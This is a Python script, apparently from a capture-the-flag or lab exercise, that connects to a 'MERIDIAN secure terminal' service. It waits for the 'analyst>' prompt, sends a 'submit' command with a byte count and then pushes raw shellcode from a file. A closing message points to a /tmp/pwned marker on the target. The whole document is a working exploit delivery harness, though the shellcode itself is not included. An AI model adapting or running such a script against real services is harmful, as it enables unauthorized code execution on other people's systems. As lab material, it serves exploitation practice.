#!/usr/bin/env python3
"""
send_shellcode.py — Send a shellcode binary to the MERIDIAN secure terminal.

Usage: python3 send_shellcode.py <shellcode.bin> [host] [port]

Connects to the MERIDIAN service, waits for the analyst> prompt,
sends 'submit <size>', then sends the raw shellcode bytes.
"""

import sys
import socket
import time

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <shellcode.bin> [host] [port]")
        sys.exit(1)

    sc_path = sys.argv[1]
    host = sys.argv[2] if len(sys.argv) > 2 else "localhost"
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 11337

    with open(sc_path, "rb") as f:
        shellcode = f.read()

    print(f"[*] Shellcode: {len(shellcode)} bytes from {sc_path}")
    print(f"[*] Connecting to {host}:{port}...")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))

    # Read banner + prompt
    data = b""
    while b"analyst>" not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    print(data.decode(errors="replace").strip())

    # Send submit command
    cmd = f"submit {len(shellcode)}\n".encode()
    print(f"[*] Sending: {cmd.strip().decode()}")
    s.send(cmd)
    time.sleep(0.5)

    # Read acknowledgment
    try:
        ack = s.recv(4096)
        print(ack.decode(errors="replace").strip())
    except socket.timeout:
        pass

    # Send shellcode bytes
    print(f"[*] Sending {len(shellcode)} bytes of shellcode...")
    s.send(shellcode)
    time.sleep(1)

    # Read any response
    try:
        resp = s.recv(4096)
        print(resp.decode(errors="replace").strip())
    except socket.timeout:
        pass

    s.close()
    print("[*] Done. Check /tmp/pwned on the target.")

if __name__ == "__main__":
    main()
